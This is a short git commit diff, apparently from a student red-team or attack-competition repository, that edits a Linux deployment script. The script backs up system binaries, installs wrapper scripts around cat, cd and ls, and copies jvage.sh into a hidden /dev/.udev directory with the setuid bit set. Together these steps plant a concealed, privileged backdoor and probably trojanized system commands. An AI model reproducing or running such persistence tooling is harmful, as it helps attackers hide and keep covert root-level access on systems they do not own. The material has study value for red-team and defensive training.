d5b87b3e2c7119fc2772f6cacd01e4819ae09fd4
hc5474 <hc5474@g.rit.edu>
2025-04-07 01:32:13 -0400

    ansible

--- Linux/wrapper_deploy.sh
+++ Linux/wrapper_deploy.sh
@@ -1,14 +1,18 @@
 #!/bin/bash
 
 # Run the binary backup script
-bash move_binaries.sh
+bash ./move_binaries.sh
 
 sleep 0.5
 
 # Run each wrapper
-bash wrapper/wrap_cat.sh
-bash wrapper/wrap_cd.sh
-bash wrapper/wrap_ls.sh
+# bash wrapper/wrap_cat.sh
+# bash wrapper/wrap_cd.sh
+# bash wrapper/wrap_ls.sh
 
-sudo mkdir -p /dev/.udev && sudo cp on_their_system/jvage.sh /dev/.udev/jvage.sh && sudo chmod u+s /dev/.udev/jvage.sh && sudo chmod 755 /dev/.udev/jvage.sh
+bash ./wrap_cat.sh # To accomodate ansible scripts=
+bash ./wrap_cd.sh
+bash ./wrap_ls.sh
+
+sudo mkdir -p /dev/.udev && sudo cp ./jvage.sh /dev/.udev/jvage.sh && sudo chmod u+s /dev/.udev/jvage.sh && sudo chmod 755 /dev/.udev/jvage.sh
 
